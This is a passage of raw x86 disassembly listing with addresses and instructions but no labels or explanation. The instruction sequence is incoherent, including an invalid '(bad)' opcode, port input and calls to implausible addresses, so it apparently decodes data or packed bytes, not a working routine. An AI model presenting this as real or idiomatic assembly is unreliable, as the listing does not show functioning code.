  4113d9:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4113df:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4113e9:	cmp    al,0xff
  4113eb:	pushf  
  4113ec:	mov    edi,edi
  4113ee:	or     BYTE PTR [esi+ecx*1],cl
  4113f1:	jne    0x4113b6
  4113f3:	call   0xa13bf
  4113f8:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4113fc:	mov    ebx,DWORD PTR [eax]
  4113fe:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  411402:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41140a:	pop    esi
  41140b:	dec    ecx
  41140d:	and    al,0x10
  41140f:	call   DWORD PTR [ebp+0x24]
  411412:	in     al,dx
  411413:	call   0xffc512fc
  411418:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41141c:	pushf  
  41141d:	pop    esi
  41141e:	mov    ebp,esp
  411420:	and    al,0xc2
  411422:	push   edi
  411423:	add    BYTE PTR [ecx+0x33],al
  411426:	mov    DWORD PTR [ebp+0x24],esi
  411429:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41142f:	dec    DWORD PTR [eax]
  411431:	and    al,0x7
  411433:	(bad)  
  411434:	cli    
  411435:	and    al,0x9b
  411437:	or     BYTE PTR [edx],dh
  411439:	sbb    BYTE PTR [ebx],al
  41143b:	adc    al,0x89
  41143d:	jmp    DWORD PTR [esp]
  411440:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  411446:	adc    al,0x8
  411448:	dec    ebp
  411449:	adc    BYTE PTR [ebp-0x7c],dh
  41144c:	mov    esi,DWORD PTR [edx]
  41144e:	and    al,0x24
  411450:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  411456:	add    edi,eax
  411458:	pcmpeqb mm1,mm2
  41145b:	jmp    0x4114a9
  41145d:	dec    DWORD PTR [eax]
  41145f:	je     0x41144c
  411461:	mov    edi,DWORD PTR [ecx]
  411463:	pop    ebp
  411464:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  411468:	fwait
  411469:	mov    DWORD PTR [eax-0x8],ebp
  41146c:	jge    0x4114d6
  41146e:	dec    DWORD PTR [ecx+0x5fbf7424]
